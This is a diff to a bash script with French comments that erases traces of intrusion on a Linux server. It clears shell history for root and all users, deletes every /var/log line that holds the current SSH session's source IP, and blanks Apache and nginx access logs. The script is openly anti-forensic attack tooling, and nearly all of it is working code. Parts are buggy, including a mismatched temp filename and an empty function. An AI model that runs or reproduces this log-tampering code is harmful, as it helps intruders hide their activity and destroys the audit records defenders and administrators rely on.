@@ -12,7 +12,7 @@ usage() {
 }
 
 brutal_way() {
-echo "Clearing all logs..."
+echo "Cleaning all logs..."
 history -cw
 echo " " > /root/.*history
 echo " " > /home/*/.*history
@@ -29,12 +29,40 @@ fi
 }
 
 subtil_way() {
-echo "subtil way"
+from=$(who | cut -d"(" -f2 | cut -d")" -f1 | tail -1)
+
+##On récupère tous les fichiers logs qui contiennent l'IP de provenance et on efface les lignes correspondantes
+
+echo "Cleaning all logs..."
+find /var/log/ -type f -exec grep -H "${from}" {} \; > /tmp/tmp.txt
+sed 's/\/var\/log/\n&/g' /tmp/tmp.txt > /tmp/tmp2.txt
+cat /tmp/tmp2.txt | awk -F ':' '{print $1}' | sort -u > /tmp/log_files.txt
+sed -i '/^$/d' /tmp/log_files.txt
+cat /tmp/log_files.txt | grep /var | while read line
+do
+  sed -i "/${from}/d" $line > /dev/null 2>&1
+done
+
+read -p "Do you want to clear HTTP logs [Yes/no] ?" -n 1 -r
+echo ""
+if [[ $REPLY =~ ^[Yy]$ ]]; then
+  clear_http
+else
+  echo "HTTP logs won't be cleaned"
+fi
+
+read -p "Do you want to clear FTP logs [Yes/no] ?" -n 1 -r
+echo ""
+if [[ $REPLY =~ ^[Yy]$ ]]; then
+  clear_ftp
+else
+  echo "FTP logs won't be cleaned"
+fi
+
 }
 
 clear_http() {
-##Essayer d'effacer les logs HTTP en fonction d'où provient la co
-
+##Efface toutes les lignes dans le access_log, à voir pour rajouter le error
 web_server=$(lsof -i | grep LISTEN | grep http | head -n 1 | awk '{print $1}')
 case ${web_server} in
   apache2)
@@ -55,22 +83,34 @@ case ${web_server} in
       ##Mode bourrin : ON
       cat /tmp/vhost_logs2.txt | while read line
         do
+          ##On enlève toutes les lignes dans les logs
           echo " " > "${line}"
         done
-  
     fi
     ;;
   nginx)
     nginx_dir="/etc/nginx/"
+    if [ -d ${nginx_dir} ]; then
+      grep access.log ${nginx_dir}/sites-enabled/* > /tmp/vhost_logs.txt
+      cat /tmp/vhosts_logs.txt | awk '{print $3}' > /tmp/vhost_logs2.txt
+      ##Mode bourrin : ON
+      cat /tmp/vhost_logs2.txt | while read line
+        do
+          ##On enlève toutes les lignes dans les logs
+          echo " " > "${line}"
+        done
+    fi
     ;;
   *)
-   echo "Unknown web server"
+   echo "Unknown web server. Script will exit."
+   exit 1
    ;;
 esac
+
 }
 
 clear_ftp() {
-echo " test"
+
 }
 
 if [ -z ${1} ]
@@ -80,8 +120,7 @@ fi
 
 while getopts "bs" opt; do
   case $opt in
-    b) #brutal_way
-      clear_http
+    b) brutal_way
       ;;
     s) subtil_way
       ;;
